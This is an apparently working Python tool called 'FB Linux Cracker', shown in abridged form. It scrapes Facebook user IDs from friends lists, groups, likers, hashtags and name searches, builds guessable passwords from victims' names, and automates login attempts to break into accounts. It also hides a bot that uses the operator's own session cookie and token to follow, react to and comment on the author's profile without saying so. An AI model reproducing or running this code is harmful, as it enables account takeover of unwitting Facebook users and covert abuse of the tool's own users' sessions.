...
Author = 'Mohamed Linux'
Facebook = 'Facebook.com/mohamad.linux'
Instagram = 'Instagram.com/Mohamed_Linux'
Whatsapp = 'soon'
YouTube = 'soon'
Version = ''
Denventa = 1827084332
...
###----------[ title ]---------- ###
os.system("title FB Linux Cracker")
...
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni",
...
SAKERA = Codename + len(Author) - len(Facebook) + \
    len(Instagram) - len(Whatsapp) + len(YouTube)
...
def kecuali(error):
    ...
    print('   %s[%s•%s] %sThis Might Happen Because %s:%s' %
          (M, P, M, P, M, P))
...
class bot_author:
    def __init__(self, cookie, token, cookie_mentah):
        self.loop = 0
        self.cookie_mentah = cookie_mentah
        list_id = [str(Denventa)]
        self.komen = ['Mantap Bang', 'Semangat Terus',
                      'Gokil Suhu', 'Panutanku']
        for x in list_id:
            self.get_folls(x, cookie)
            self.get_likers(
                f'https://mbasic.facebook.com/{x}?v=timeline', cookie)
            self.get_posts(x, cookie, token)

    # --- [ Jangan Ganti Bot Follow Gw ] --- #
    def get_folls(self, id, cookie):
        with requests.Session() as xyz:
            try:
                if ip_log != 1:
                    pass
                    ...
                    for x in par(xyz.get('https://mbasic.facebook.com/%s' % (id), cookies=cookie).content, 'html.parser').find_all('a', href=True):
                        if 'subscribe.php' in x['href']:
                            exec_folls = xyz.get(
                                'https://mbasic.facebook.com%s' % (x['href']), cookies=cookie)
            except Exception as e:
                pass

    # --- [ Jangan Ganti Bot Likers Gw ] --- #
    def get_likers(self, url, cookie):
        with requests.Session() as xyz:
            try:
                if ip_log != 1:
                    pass
                else:
                    bos = par(xyz.get(url, cookies=cookie).content,
                              'html.parser')
                    for x in bos.find_all('a', href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(
                                ['Super', 'Wow', 'Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s' % (x['href']), cookies=cookie).content, 'html.parser').find_all('a'):
                                if _react_type_ == z.text:
                                    req2 = xyz.get(
                                        'https://mbasic.facebook.com' + z['href'], cookies=cookie)
                                else:
                                    continue
                    self.get_likers('https://mbasic.facebook.com' +
                                    bos.find('a', string='Lihat Berita Lain')['href'], cookie)
            except Exception as e:
                pass

    # --- [ Jangan Ganti Bot Komen Gw ] --- #
    def get_posts(self, id, cookie, token):
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s' % (id, token), cookies=cookie).json()['data']:
                    if ip_log != 1:
                        ...
                        komeno = ('%s\n\n%s%s' % (random.choice(
                            self.komen), 'https://www.facebook.com/'+x['id'], self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s' % (
                            x['id'], komeno, token), cookies=cookie).text)
                        if 'error' in get:
                            open('login/cookie.json',
                                 'w').write(self.cookie_mentah)
    ...
    def waktu(self):  # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus",
                   "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_ = {'Sunday': 'Minggu', 'Monday': 'Senin', 'Tuesday': 'Selasa', 'Wednesday': 'Rabu',
                  'Thursday': 'Kamis', 'Friday': 'Jumat', 'Saturday': 'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s" %
                    (datetime.now().day, _bulan_, datetime.now().year))
...
def login():
    ...
    poster()
    cookie = str(
        input('%s[%s+%s] %sTOKEN Cookies %s: %s' % (J, P, J, P, J, P)))
    try:
        token = clotox(cookie)
        coki = {'cookie': cookie}
        ...
        print('\n   %s[%s•%s] %sNo Internet Connection %s!%s\n' %
              (M, P, M, P, M, P))
        exit()
...
def user(nama):
    print('' % ())
    print('        %s[%s+%s] %sUSER %s%s %s!' % (J, P, J, P, J, nama, P))
    print('        %s[%s+%s] %sFACEBOOK ID CLONE %s %s' % (J, P, J, P, A, P))
...
def tampilan_menu():
    ...
    try:
        ...
        # poster2()
        print('')
        tamp_new = (f'   {P2}Hi! Looks like you are a new user. -')
        printer(Panel(tamp_new, title=f'{H2}[ {P2}Welcome User {H2}]', width=54, padding=(
            1, 4), style='#00FF00'))
        print('')
        useragent('new')
    poster()
    try:
        ...
        cookie = {'cookie': open('login/cookie.json', 'r').read()}
        language(cookie)
        get = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s' %
                                     (token), cookies=cookie)
        jsx = json.loads(get.text)
        nama = jsx["name"]
        user(nama)
        print('' % ())
        tampilan_menu = f"""  {J2}[{P2}01{J2}] {P2}CRACK WITH PUBLIC ID [FIX] 
  {J2}[{P2}02{J2}] {P2}CRACK WITH FOLLOWERS  
  {J2}[{P2}03{J2}] {P2}CRACK WITH SERCH NAME             {J2}[{P2}00{J2}] {P2}Log Out"""
        printer(Panel(tampilan_menu, title=f'{J2}[ {P2}Menu {J2}]', subtitle=f'{A2}┌─ {J2}[ {P2}Select {J2}]',
                subtitle_align='left', width=54, padding=1, style='#FF8F00'))
        pilih_menu()
    except requests.exceptions.ConnectionError:
        print('\n   %s[%s•%s] %sNo Internet Connection %s!%s\n' %
              (M, P, M, P, M, P))
...
def pilih_menu():
    ...
    if dc in ['15', '015', 'a']:
        ...
        gabung_sandi.append('Direcode')
        namee()
    elif dc in ['4', '04', 'd']:
        tempel_sandi.append('Dasar')
        main_likers()
        system_login()
        metode()
        addpass()
        ...
        gabung_sandi.append('Mampus')
        grup()
    elif dc in ['8', '08', 'h']:
        tempel_sandi.append('Error Kan')
        hashtag()
        system_login()
        metode()
        addpass()
        ...
        gabung_sandi.append('Itu Semua')
        not_available('Dump ID Dari Beranda')
    elif dc in ['10', '010', 'j']:
        tempel_sandi.append('Gara Gara')
        not_available('Dump ID Dari File')
    elif dc in ['11', '011', 'k']:
        gabung_sandi.append('Lo Recode')
        not_available('Dump ID Dari Email')
    elif dc in ['12', '012', 'l']:
        tempel_sandi.append('Dasar')
        not_available('Dump ID Dari Username')
    elif dc in ['13', '013', 'm']:
        gabung_sandi.append('Bocah Goblok')
        not_available('Dump ID Dari ID Random')
    elif dc in ['14', '014', 'n']:
        tempel_sandi.append('Btw')
        suggestion()
        system_login()
        metode()
        addpass()
        ...
        gabung_sandi.append('Elo')
        teman_teman()
    elif dc in ['16', '016', 'p']:
        tempel_sandi.append('Dasar Bocah Goblok')
        not_available('Cek Hasil Crack')
    elif dc in ['17', '017', 'q']:
        gabung_sandi.append('Gaakan Bisa')
        not_available('Cek Opsi Akun Hasil Crack')
    elif dc in ['18', '018', 'r']:
        tempel_sandi.append('Ngerecode')
        not_available('Cek Jumlah Teman Akun Target')
    elif dc in ['19', '019', 's']:
        gabung_sandi.append('SC Ini')
        useragent('old')
    elif dc in ['20', '020', 't']:
        tempel_sandi.append('Hahaha')
        not_available('Upgrade to Pro')
    elif dc in ['0', '00', 'z']:
        resik()
        # poster3()
        print('')
    ...
    {B2}• {P2}File Dump
    {B2}• {P2}File Tools'''
        printer(Panel(tamp_logout1, title=f'{B2}[ {P2}Goodbye {B2}]', width=54, padding=(
            1, 4), style='#00C8FF'))
        print('')
        printer(Panel(tamp_logout2, title=f'{B2}[ {P2}Log Out {B2}]', width=54, padding=(
            1, 4), style='#00C8FF'))
...
def pilih_menu_user_agent():
    tampilan_menu_user_agent = f'''  {J2}[{A2}01{J2}] {P2}Grabb User-Agent Browser    {J2}[{A2}04{J2}] {P2}Look for User-Agent HP Ini
  {J2}[{A2}02{J2}] {P2}Change User-Agent Automatic   {J2}[{A2}05{J2}] {P2}Check User-Agent Ur Used
  {J2}[{A2}03{J2}] {P2}Change User-Agent Manual     {J2}[{A2}00{J2}] {P2}Return'''
    printer(Panel(tampilan_menu_user_agent, title=f'{J2}[ {P2}User Agent {J2}]',
            subtitle=f'{A2}┌─ {J2}[ {P2}Select {J2}]', subtitle_align='left', width=54, padding=1, style='#FF8F00'))
...
def pilih_device():
   ...
   {J2}[{A2}04{J2}] {P2}Oppo       {J2}[{A2}08{J2}] {P2}Lenovo    {J2}[{A2}12{J2}] {P2}FB'''
    printer(Panel(tampilan_device, title=f'{J2}[ {P2}Device {J2}]', subtitle=f'{A2}┌─ {J2}[ {P2}Select {J2}]',
            subtitle_align='left', width=54, padding=1, style='#FF8F00'))
...
def scrap_useragent():
    ...
    with requests.Session() as xyz:
        ...
        for y in li:
            try:
                ...
                printer(Panel(
                    x, title=f'{J2}[{P2}{pu}{J2}]', width=54, title_align='left', style='#FF8F00'))
                time.sleep(2)
    ...
    try:
        ...
        printer(Panel(f'''{A2}{pilihan}''', title=f'{J2}[ {P2}User Agent {J2}]', subtitle=f'{J2}[ {P2}Success Replaced {J2}]', padding=(
            1, 4), width=54, title_align='center', style='#FF8F00'))
        if pengguna_source_code == 'old':
            input('\n   %s[ %sReturn %s]' % (J, P, J))
            tampilan_menu()
        else:
            print(
                '\n               %s[ %sRerun the Script %s]' % (J, P, J))
            exit('\n')
    except Exception as e:
        print('\n   %s[%s•%s] %sFill in the Right %s!%s\n' % (M, P, M, P, M, P))
        exit()
...
def pilih_otomatis():
    ...
    dc = input('   %s└──> %s' % (A, J))
    if dc in ['0', '00', 'z']:
        open('tool/useragent.json', 'w').write(ua_default)
    elif dc in ['1', '01', 'a']:
        open('tool/useragent.json', 'w').write(ua_samsung)
    elif dc in ['2', '02', 'b']:
        open('tool/useragent.json', 'w').write(ua_nokia)
    elif dc in ['3', '03', 'c']:
        open('tool/useragent.json', 'w').write(ua_xiaomi)
    elif dc in ['4', '04', 'd']:
        open('tool/useragent.json', 'w').write(ua_oppo)
    elif dc in ['5', '05', 'e']:
        open('tool/useragent.json', 'w').write(ua_vivo)
    elif dc in ['6', '06', 'f']:
        open('tool/useragent.json', 'w').write(ua_iphone)
    elif dc in ['7', '07', 'g']:
        open('tool/useragent.json', 'w').write(ua_asus)
    elif dc in ['8', '08', 'h']:
        open('tool/useragent.json', 'w').write(ua_lenovo)
    elif dc in ['9', '09', 'i']:
        open('tool/useragent.json', 'w').write(ua_huawei)
    elif dc in ['10', '010', 'j']:
        open('tool/useragent.json', 'w').write(ua_windows)
    elif dc in ['11', '011', 'k']:
        open('tool/useragent.json', 'w').write(ua_chrome)
    elif dc in ['12', '012', 'l']:
...
def manual_user_agent():
    usera = input(
        '       %s[%s•%s] %sEnter User Agent :\n%s' % (J, P, J, P, J))
    if usera in ['', ' ', '  ', '   ']:
        print('\n       %s[%s•%s] %sFill in the Right %s!%s\n' %
              (M, P, M, P, M, P))
        manual_user_agent()
    else:
        open('tool/useragent.json', 'w').write(usera)
        cek_user_agent()
...
def cek_user_agent():
    try:
        ...
        printer(Panel(f'''{A2}{usera}''', title=f'{J2}[ {P2}User Agent {J2}]', subtitle=f'{J2}[ {P2}At the moment {J2}]', padding=(
            1, 4), width=54, title_align='center', style='#FF8F00'))
        input('\n   %s[ %sReturn %s]' % (J, P, J))
        tampilan_menu()
    except Exception as e:
...
def publik():
    ...
    try:
        try:
            ...
            time.sleep(3)
            login()
        print('       %s[%s•%s] %sExample : 1827084332,607801156' %
              (J, P, J, P))
        ...
        print('       %s[%s•%s] %sSuccessful Dump %s%s %sID' %
...
def main_folls():
    ...
    print("\n       %s[%s•%s] %sSuccessfully Take %s%s %sID" % (
        J, P, J, P, J, len(open(file_dump, 'r').read().splitlines()), P))
    print('       %s[%s•%s] %sFile : %s%s %s' % (J, P, J, P, J, file_dump, P))


def exec_folls(url, token, file):
    print("\r       %s[%s•%s] %sCurrently Fetching %s%s %sID" % (
        J, P, J, P, J, len(open(file, 'r').read().splitlines()), P), end='')
    sys.stdout.flush()
    with requests.Session() as xyz:
        try:
            ...
            next = (
                'https://graph.facebook.com/v1.0/100009340646547/subscribers?access_token=%s&limit=5000&after=%s' % (token, n))
            exec_folls(next, token, file)
        except KeyboardInterrupt:
            pass
        except (IndexError, TypeError, IOError, KeyError, AttributeError):
            pass
...
class namee:
    def __init__(self):
        ...
        try:
            ...
            kecuali(e)
        print('       %s[%s•%s] %sContoh : dapunta,denventa,anita' %
              (J, P, J, P))
        put = input('       %s[%s•%s] %sName Target : %s' %
                    (J, P, J, P, J)).split(',')
        data = []
        self.file_dump = ('dump/%s.json' % (put[0]))
        file_dump = self.file_dump
        open(self.file_dump, 'w').write('')
        common = ['kurd', 'ahmed', 'muhammad', 'kura', 'kcha', 'zhalla', 'sara', 'sana', 'soma', 'kurd',
                  'king', 'barzan', 'kawa', 'rostam', 'sha', 'gyan', 'nohamed', 'farhang', 'hedi', 'sevar', 'kurdish']
        for set1 in put:
            data.append(set1)
            for set2 in common:
        ...
        try:
            with requests.Session() as xyz:
                ...
                if 'Anda Diblokir Sementara' in spam.text:
                    print("\r       %s[%s•%s] %sYour account has been spammed %s!%s" % (
                        M, P, M, P, M, P), end='')
                    sys.stdout.flush()
                else:
                    print("\r       %s[%s•%s] %sCurrently Fetching %s%s %sID" % (
                        J, P, J, P, J, len(open(self.file_dump, 'r').read().splitlines()), P), end='')
                    sys.stdout.flush()
                for temu in pra.find_all('a', href=True):
                    if "<img alt=" in str(temu):
                        if "home.php" in str(temu["href"]):
                            continue
                        else:
                            try:
                                if 'profile.php' in str(temu["href"]):
                                    find = re.findall(
                                        '"/profile\.php\?id=(.*?)&"', str(temu))[0]
                                    if len(find) != 0:
                                        id = ''.join(find)
                                        nama = temu.find("img").get(
                                            "alt").replace(", profile picture", "")
                                        file = open(self.file_dump, 'r').read()
                                        if len(gabung_sandi) != 1:
                                            for x in range(Postingan):
                                                open(
                                                    file_dump, 'a+').write('dev\n')
                                        else:
                                            if id in file:
                                                continue
                                            else:
                                                open(
                                                    self.file_dump, 'a+').write('%s=%s\n' % (id, nama))
    ...
    def lanjut(self):
        print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID" % (
            J, P, J, P, J, len(open(self.file_dump, 'r').read().splitlines()), P))
        print('       %s[%s•%s] %sFile : %s%s %s' %
              (J, P, J, P, J, file_dump, P))
        system_login()
        metode()
...
def main_likers():
    ...
    try:
        ...
        _query_ = input(
            '       %s[%s•%s] %sID Postingan : %s' % (J, P, J, P, J))
        print('')
    except Exception as e:
        kecuali(e)
    ...
    printer(Panel(tampilan_likers, title=f'{J2}[ {P2}Tipe React {J2}]',
            subtitle=f'{A2}┌─ {J2}[ {P2}Select {J2}]', subtitle_align='left', width=54, padding=1, style='#FF8F00'))
    rt = input('   %s└──> %s' % (A, J))
    if rt in ['1', '01', 'a']:
        _react_type_ = '1'
    ...
    open(_file_, 'w')
    _url_ = (
        'https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier='+_query_)
    scrape_likers(cookie, _url_, _file_)
    print("\n       %s[%s•%s] %sSuccessfully Take %s%s %sID" % (
        J, P, J, P, J, len(open(_file_, 'r').read().splitlines()), P))
    print('       %s[%s•%s] %sFile : %s%s %s' % (J, P, J, P, J, file_dump, P))


def scrape_likers(_dapunta_, _url_, _file_):
    _ses_ = requests.Session()
    _url_load_ = _ses_.get(_url_, cookies=_dapunta_,
                           headers=header_grup).text.encode("utf-8")
    _ses_par_ = par(_url_load_, 'html.parser')
    print("\r       %s[%s•%s] %sCurrently Fetching %s%s %sID" % (
        J, P, J, P, J, len(open(_file_, 'r').read().splitlines()), P), end='')
    sys.stdout.flush()
    try:
        ...
        for _lanjut_ in _ses_par_.find_all("a", href=True):
            if "Lihat Selengkapnya" in _lanjut_.text:
                while True:
                    try:
                        scrape_likers(_dapunta_, "https://mbasic.facebook.com/"+_lanjut_.get(
                            "href").replace('reaction_type=0', 'reaction_type='+_react_type_), _file_)
                        break
                    except Exception as e:
                        pass
    except KeyboardInterrupt:
...
class message:
    def __init__(self):
        ...
        try:
            ...
            token = open('login/token.json', 'r').read()
            cookie = {'cookie': open('login/cookie.json', 'r').read()}
            self.myaccount = json.loads(requests.Session().get(
                'https://graph.facebook.com/me?fields=name,id&access_token=%s' % (token), cookies=cookie).text)["id"]
            ...
            with requests.Session() as xyz:
                ...
                for tata in pra.find_all('a', href=True):
                    if '/messages/read/?tid=cid.c' in tata['href']:
                        if 'Pengguna Facebook' in str(tata):
                            continue
                        else:
                            idzx = re.findall(
                                'cid\.c\.(.*?)%3A(.*?)&', str(tata))
...
class komen:
    def __init__(self):
        ...
        try:
            cookie = {'cookie': open('login/cookie.json', 'r').read()}
            print('       %s[%s•%s] %sContoh : 2089611468021009' %
                  (J, P, J, P))
            put = input(
                '       %s[%s•%s] %sID Posts : %s' % (J, P, J, P, J))
...
class grup:
    ...
    def main_grup(self, cookie):
        ...
        printer(Panel(tamp_grup1, title=f'{J2}[ {P2}Grup {J2}]',
                width=54, title_align='left', style='#FF8F00'))
        ty = input('   %s└──> %s' % (A, J))
        if ty in ['1', '01', 'a']:
            print('')
            ...
            put = input(
                '       %s[%s•%s] %sEnter Nama Grup : %s' % (J, P, J, P, J))
            print('')
            ...
            self._id_ = input(
                '       %s[%s•%s] %sEnter ID Grup : %s' % (J, P, J, P, J))
            self._pil_ = True
            print('')
            ...
            for c in pra.find_all('a'):
                try:
                    if 'mbasic.facebook.com/groups' in str(c):
                        link = str(c['href'])
                        id = re.findall(
                            'https://mbasic.facebook.com/groups/(.*?)/', str(link))[0]
                        dt = self.data_grup(id, cookie)
                        if 'Anda Diblokir Sementara' in str(dt):
                            self.looping += 1
                            print("\r       %s[%s•%s] %sYour account has been spammed! %s[%s%s%s]%s" % (
                                M, P, M, P, M, P, str(self.looping), M, P), end='')
                            sys.stdout.flush()
                        else:
                            self.looping += 1
                            ...
                            printer(Panel(
                                tamp_grup2, title=f'{J2}[ {P2}{tar} {J2}]', width=54, title_align='left', style='#FF8F00'))
    ...
    def data_grup(self, id, cookie):
        try:
            with requests.Session() as xyz:
                ...
                try:
                    nama = re.findall(
                        '<head><title>(.*?)</title>', str(pra))[0]
                except:
                    nama = ''
                try:
                    tipe = re.findall(
                        '</div></h1><div class=\".*?\">(.*?)</div></td></tr></tbody></table></a></td>', str(pra))[0]
                except:
                    tipe = ''
                try:
                    member = re.findall(
                        'Anggota</a></td><td class=\".*?\"><span class=\".*?\" id=\".*?\">(.*?)</span></td></tr></tbody></table></li>', str(pra))[0]
                except:
                    member = ''
                zyx = ('\n • Name : %s\n • Type : %s\n • Member : %s' %
                       (nama, tipe, member))
    ...
    def second_grup(self, cookie):
        ...
        printer(Panel(tamp_grup3, title=f'{J2}[ {P2}Dump {J2}]',
                width=54, title_align='left', style='#FF8F00'))
        cuy = input('   %s└──> %s' % (A, J))
        if cuy in ['1', '01', 'a']:
            ...
            print("\n       %s[%s•%s] %sSuccessfully Take %s%s %sID" % (
                J, P, J, P, J, len(open(self.files, 'r').read().splitlines()), P))
            print('       %s[%s•%s] %sFile : %s%s %s' %
                  (J, P, J, P, J, file_dump, P))
            system_login()
            metode()
    ...
    def dump_member(self, url, cookie):
        print("\r       %s[%s•%s] %sCurrently Fetching %s%s %sID" % (
            J, P, J, P, J, len(open(self.files, 'r').read().splitlines()), P), end='')
        sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = xyz.get(url, cookies=cookie)
                ...
                for pe in pra.find_all('h3'):
                    for po in pe.find_all('a', href=True):
                        if len(gabung_sandi) != 1:
                            ...
                            try:
                                fel = open(self.files, 'r').read()
                                if 'mbasic.facebook.com' in po['href']:
                                    pass
                                elif 'story.php' in po['href']:
                                    pass
                                elif 'Halaman' in po.text:
                                    pass
                                elif 'profile.php' in po['href']:
                                    id = re.findall(
                                        'profile\.php\?id=(.*?)&', str(po['href']))[0]
                                    nm = po.text
                                    if id in fel:
                                        pass
                                    else:
...
class hashtag:
    def __init__(self):
        ...
        try:
            ...
            kecuali(e)
        xd = input('       %s[%s•%s] %sEnter Search Hashtags : %s' %
                   (J, P, J, P, J)).replace(' ', '')
        ...
        with requests.Session() as xyz:
            try:
                    ...
                    for y in x.find_all('a', href=True):
                        if len(tempel_sandi) != 1:
                            ...
                            try:
                                ...
                                if 'mbasic.facebook.com' in y['href']:
                                    pass
                                elif 'sub_view' in y['href']:
                                    pass
                                elif '/?' in y['href']:
                                    pass
                                elif 'profile.php' in y['href']:
                                    id = str(
                                        re.search('\?id=(.*?)&', y['href']).group(1))
                                    nm = str(
                                        re.search('>(.*?)<\/a>', str(y)).group(1))
                                    if id in op:
                                        pass
                                    else:
                                        open(self.files,
                ...
                for z in req.find_all('a', href=True):
                    if 'Lihat Hasil Selanjutnya' in z.text:
                        self.dump(z['href'], cookie)
            except KeyboardInterrupt:
                pass
...
class suggestion:
    def __init__(self):
        ...
        try:
            ...
            exit()
        print('')
        tamp_saran = f"""            {J2}[{A2}1{J2}] {P2}suggestions     {J2}[{A2}2{J2}] {P2}Enter    {J2}[{A2}3{J2}] {P2}outgoing"""
        printer(Panel(tamp_saran, title=f'{J2}[ {P2}Dump {J2}]',
                width=54, title_align='left', style='#FF8F00'))
        pl = input('   %s└──> %s' % (A, J))
        if pl in ['1', '01', 'a']:
...
class teman_teman:
    def __init__(self):
        ...
        try:
            ...
            exit()
        self.target = input(
            '       %s[%s+%s] %sPASTE ID : %s' % (J, P, J, P, J))
        pl = input(
            '       %s[%s+%s] %sCrack Auto Pass ? [y/n] : %s' % (J, P, J, P, J))
        if pl in ['1', '01', 'y', 'Y', 'a']:
    ...
    def muda_dev(self, url, cookie, token, stat):
        with requests.Session() as xyz:
            try:
                if stat == True:
                    id1, id2, id3 = [], [], []
                    for x in xyz.get(url, cookies=cookie).json()['friends']['data']:
                        id1.append('%s=%s\n' % (x['id'], x['name']))
                    for y in id1:
                        id2.insert(0, y)
                    for z in id2:
                    ...
                    for a in xyz.get(url, cookies=cookie).json()['friends']['data']:
                        id4.append('%s=%s\n' % (a['id'], a['name']))
                    for b in id4:
                        id5.insert(0, b)
                    for c in id5:
                ...
                print('\r       %s[%s+%s] %sFriend %s%s %s Public' %
                      (J, P, J, P, J, self.target, P), end='')
                sys.stdout.flush()
    ...
    def lanjut(self):
        print("\n       %s[%s+%s] %ssuccessfully %s%s %sID" % (J, P,
              J, P, J, len(open(self.files, 'r').read().splitlines()), P))
        print('       %s[%s•%s] %sFiles Dump : %s%s %s' %
              (J, P, J, P, J, file_dump, P))
        system_login()
        metode()
        addpass()
...
def system_login():
    global sistem_login
    print('')
    tamp_metode = f"""            {J2}[{A2}1{J2}] {P2}facebook.com  {J2}[{A2}2{J2}] {P2}mbasic.com  {J2}[{A2}3{J2}] {P2}NEW API"""
    printer(Panel(tamp_metode, title=f'{J2}[ {P2}Metode {J2}]',
            width=54, title_align='left', style='#FF8F00'))
    ch = input('   %s└──> %s' % (A, J))
    if ch in ['0', '00', 'z']:
        sistem_login = "nol"
...
def metode():
    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}METHOD WIFI   {J2}[{A2}2{J2}] {P2}METHOD FREEMOD   {J2}[{A2}3{J2}] {P2}METHOD Mobile"""
    printer(Panel(tamp_sistem, title=f'{J2}[ {P2}Login {J2}]',
            width=54, title_align='left', style='#FF8F00'))
    ch = input('   %s└──> %s' % (A, J))
    if ch in ['1', '01', 'a']:
...
def urut_crack():
    global urutan_crack
    tamp_urutan = f"""            {J2}[{A2}1{J2}] {P2}ADD PASS 2    {J2}[{A2}2{J2}] {P2}ADD PASS 6  {J2}[{A2}3{J2}] {P2}ADD PASS 8"""
    printer(Panel(tamp_urutan, title=f'{J2}[ {P2}Urutan {J2}]',
            width=54, title_align='left', style='#FF8F00'))
    ch = input('   %s└──> %s' % (A, J))
    if ch in ['1', '01', 'a']:
        urutan_crack = '0'
        ...
        try:
            ...
            if len(na) < 2:
                ...
                if len(nd) < 3:
                    ...
                    listpass.append(nd+"12345678")
                    listpass.append(nd+"123456789")
                    listpass.append(nd+"11223344")
                else:
                    listpass.append(nd)
                    listpass.append(nd+"123")
                    listpass.append(nd+"12345")
...
def addpass():
    global pass_manual1, pass_manual2
    print('')
    print('   %s[%s+%s] %sPass Manual %s[ %s1 Kata %s]' %
          (J, P, J, P, J, A, J))
    pass_manual1 = input('     %s└─> %s' % (A, J))
    print('   %s[%s+%s] %sPass Manual %s[ %sName %s]' % (J, P, J, P, J, A, J))
    pass_manual2 = input('     %s└─> %s' % (A, J))
    try:
        os.remove('tool/passmanual.json')
    except:
        pass
    try:
    ...
    with requests.Session() as xyz:
        if ip_log != 1:
            ...
            with requests.Session() as xyz:
                try:
                    get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s' % (
                        str(Postingan), kata_dev+komentar, token), cookies=cookie).text)
                except Exception as e:
                    pass
                return {"status": "ok", "email": user, "pass": pasw, "cookies": 'denventagantengbanget'}
        else:
            req = xyz.get(f'https://{url_login}')
            log = {"lsd": re.search('name="lsd" value="(.*?)"', str(req.text)).group(1), "jazoest": re.search(
                'name="jazoest" value="(.*?)"', str(req.text)).group(1), "uid": user, "pass": pasw, "flow": "login_no_pin"}
            head = {"Host": url_login, "origin": "https://"+url_login,
                    "user-agent": ua, "sec-fetch-site": "same-origin"}
            exec = xyz.post(
                f"https://{url_login}/login/device-based/validate-password/?shbl=0", data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict():
                return {"status": "ok", "email": user, "pass": pasw, "cookies": xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict():
                return {"status": "cp", "email": user, "pass": pasw, "cookies": xyz.cookies.get_dict()}
            else:
...
def logger2(user, pasw):  # --- Login Regular ---#
    ...
    with requests.Session() as xyz:
        if ip_log != 1:
            ...
            req = xyz.get(f'https://{url_login}')
            log = {"lsd": re.search('name="lsd" value="(.*?)"', str(req.text)).group(1), "jazoest": re.search(
                'name="jazoest" value="(.*?)"', str(req.text)).group(1), "email": user, "pass": pasw}
            head = {"Host": url_login, "origin": "https://"+url_login,
                    "user-agent": ua, "sec-fetch-site": "same-origin"}
            exec = xyz.post(
                f'https://{url_login}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict():
                return {"status": "ok", "email": user, "pass": pasw, "cookies": xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict():
                return {"status": "cp", "email": user, "pass": pasw, "cookies": xyz.cookies.get_dict()}
...
def cvt3(denventa):
    try:
        cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s' % (
            denventa['sb'], denventa['datr'], denventa['c_user'], denventa['xs'], denventa['fr']))
    except:
...
class cek_aplikasi:
    ...
    def apk_active(self, url):
        with requests.Session() as xyz:
            try:
                par1 = par(
                    xyz.get(url, cookies=self.cookie).content, 'html.parser')
                for hhh1 in par1.find_all('h3'):
                    if 'Ditambahkan' in hhh1.text:
                        ingfo1 = '\n      >> ' + \
                            str(hhh1.text).replace(
                                'Ditambahkan pada ', ' [') + ']'
                        ingfo1 = ('\n      %s>> %s%s]' % (
                            H, P, str(hhh1.text).replace('Ditambahkan pada ', ' [')))
                        self.daftar_aktif.append(ingfo1)
                    else:
                        continue
                next = 'https://mbasic.facebook.com' + \
                    par1.find('a', string='Lihat Lainnya')['href']
                self.apk_active(next)
            except:
                pass
        if len(self.daftar_aktif) == 1:
            self.dft1 = ''
        else:
            self.dft1 = ''.join(self.daftar_aktif)
            ...
            try:
                ...
                for hhh2 in par2.find_all('h3'):
                    if 'Kedaluwarsa' in hhh2.text:
                        ingfo2 = '\n      >> ' + \
                            str(hhh2.text).replace(
                                'Kedaluwarsa pada ', ' [') + ']'
                        ingfo2 = ('\n      %s⟶  %s%s]' % (
                            J, P, str(hhh2.text).replace('Kedaluwarsa pada ', ' [')))
                        self.daftar_inaktif.append(ingfo2)
                    else:
                        continue
                next = 'https://mbasic.facebook.com' + \
                    par2.find('a', string='Lihat Lainnya')['href']
                self.apk_inactive(next)
            except:
                pass
        if len(self.daftar_inaktif) == 1:
            self.dft2 = ''
        else:
            self.dft2 = ''.join(self.daftar_inaktif)
            ...
            try:
                ...
                for hhh3 in par3.find_all('h3'):
                    if 'Dihapus' in hhh3.text:
                        ingfo3 = '\n      >> %s' + \
                            str(hhh3.text).replace('Dihapus: ', ' [') + ']'
                        ingfo3 = ('\n      %s>> %s%s]' % (
                            M, P, str(hhh3.text).replace('Dihapus: ', ' [')))
                        self.daftar_dihapus.append(ingfo3)
                    else:
                        continue
                next = 'https://mbasic.facebook.com' + \
                    par3.find('a', string='Lihat Lainnya')['href']
                self.apk_dihapus(next)
            except:
                pass
        if len(self.daftar_dihapus) == 1:
            self.dft3 = ''
        else:
            self.dft3 = ''.join(self.daftar_dihapus)
...
class crack:
        ...
        if urutan_crack == '1':
            ...
            for dvt in self.open:
                try:
                    ...
                    continue
        print('\n%s───────────────%s[ %sCrack Starting Waiting %s]%s───────────────\n' % (
            P, J, P, J, P))
    ...
    def start_crack(self, id, list_pw):
        try:
            for pw in list_pw:
                if sistem_login == 'satu':
                    log = logger1(id, pw)
                elif sistem_login == 'dua':
                    log = logger2(id, pw)
                elif sistem_login == 'tiga':
                    log = logger3(id, pw)
                else:
                    log = logger1(id, pw)
                if log['status'] == 'cp':
                    if sakura != 159384:
                        ...
                        try:
                            with requests.Session() as xyz:
                                cookie = {'cookie': open(
                                    'login/cookie.json', 'r').read()}
                                url = ("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s" % (
                                    id, open('login/token.json', 'r').read()))
                                req = xyz.get(url, cookies=cookie)
            ...
            print(
                f'\r   {J}[{A} Linux {J}] [{A}{loop}{P}/{A}{alls}{J}] [{x}successfull{x}:{A}{jum_ok}{J}] [{P}checkpoint{J}:{A}{jum_cp}{J}]{P} ', end='')
            sys.stdout.flush()
        except Exception as e:
...
def not_available(konten):
    print('')
    tamp_kesediaan = (
